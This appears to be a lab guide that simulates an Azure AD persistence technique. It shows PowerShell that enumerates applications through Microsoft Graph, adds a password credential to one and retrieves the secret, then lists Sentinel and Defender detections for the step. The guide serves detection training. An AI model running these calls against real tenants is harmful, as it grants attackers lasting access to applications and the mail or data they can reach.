# Add Credentials to Application

Once a threat actor identifies an application of interest to authenticate with, credentials can be added to it. This allows the adversary to use custom credentials and maintain persistence.

Based on [Microsoft documentation](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow), like a user, during the authentication flows we're focused on, an application must present credentials. 

This authentication consists of two elements:
* An Application ID, sometimes referred to as a Client ID. A GUID that uniquely identifies the app's registration in your Active Directory tenant.
* A secret associated with the application ID. You can either generate a client secret string (similar to a password) or specify an X509 certificate (which uses its public key).

[An application object is the global representation of an application for use across all tenants, and the service principal is the local representation for use in a specific tenant](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals). A service principal must be created in each tenant where the application is used, enabling it to establish an identity for sign-in and/or access to resources being secured by the tenant.

## Current Status of Application (Credentials & Secrets)

We can check if our custom Azure AD application has any credentials added to it. 

1.	Browse to [Azure Portal](https://portal.azure.com/)
2.	Go to Azure AD > App Registrations > `MyApplication` > `Certificates & secrets`

Before simulating a threat actor adding credentials to an application, we need to have a Microsoft Graph access token with permissions to add credentials to applications:

## Simulate & Detect
1.	[Enumerate existing applications](#enumerate-existing-azure-ad-applications) 
2.	[Add credentials to application](#add-credentials-to-application)
    * [Detect credentials added to an application](#detect-credentials-added-to-an-application)

## Preconditions
* Authorization
    * Identity solution: Azure AD
    * Access control model: Discretionary Access Control (DAC)
    * Service: Azure Microsoft Graph
    * Permission Type: Delegated
    * Permissions: Application.ReadWrite.All
* Endpoint: ADFS01
    * Even when this step would happen outside of the organization, we can use the same PowerShell session where we [got a Microsoft Graph access token](getAccessTokenSAMLBearerAssertionFlow.md) to go through the simulation steps.
    * Microsoft Graph Access Token
        * Use the output from the previous step as the variable `$MSGraphAccessToken` for the simulation steps. Make sure the access token is from the `Azure Active Directory PowerShell Application`. That application has the right permissions to execute all the simulation steps.

## Enumerate Existing Azure AD Applications

```PowerShell
$headers = @{"Authorization" = "Bearer $MSGraphAccessToken"}
$params = @{
    "Method"  = "Get"
    "Uri"     = https://graph.microsoft.com/v1.0/applications
    "Headers" = $headers
}
$applications = Invoke-RestMethod @params
$applications

$appObjectId = $applications.value[0].id
$appObjectId
```

## Add Credentials to Application

### Adding Credentials (Password) to an Application

```PowerShell
$pwdCredentialName = 'SimuLand2021'
$headers = @{
    "Content-Type"  = "application/json"
    "Authorization" = "Bearer $MSGraphAccessToken"
}
$body = @{
    passwordCredential = @{ displayName = "$($pwdCredentialName)" }
}
$params = @{
    "Method"  = "Post"
    "Uri"     = https://graph.microsoft.com/v1.0/applications/$appObjectId/addPassword
    "Body"    = $body | ConvertTo-Json â€“Compress
    "Headers" = $headers
}
$credentials = Invoke-RestMethod @params
$credentials
$secret = $credentials.secretText
$secret
```

Browse to [Azure Portal](https://portal.azure.com/) and go to Azure AD > App Registrations > `MyApplication` > `Certificates & secrets` to verify the task.

## Detect Credentials Added to an Application

### Azure Sentinel Detection Rules

* [New access credential added to Application or Service Principal](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/NewAppOrServicePrincipalCredential.yaml)
* [First access credential added to Application or Service Principal where no credential was present](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/FirstAppOrServicePrincipalCredential.yaml)

### Microsoft 365 Hunting Queries

* [Credentials were added to an Azure AD application after 'Admin Consent' permissions granted [Nobelium]](https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/773ebb498e0aa897678be98c34ffa56359bf29d9/Persistence/CredentialsAddAfterAdminConsentedToApp%5BNobelium%5D.md)

### Azure AD Workbook: `Sensitive Operations Report`
1.	Browse to [Azure Portal](https://portal.azure.com/)
2.	Azure AD > `Workbooks` > `Sensitive Operations Report`

### Microsoft Cloud App Security
1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/).
2.	Go to `More Resources` and click on `Microsoft Cloud App Security`.
3.	`Alerts`

## Output

Use the variable `$secret` that contains the credentials object to authenticate to the compromised application. For example, if the application has permissions to read mail, you can authenticate to the application and use it to do so.
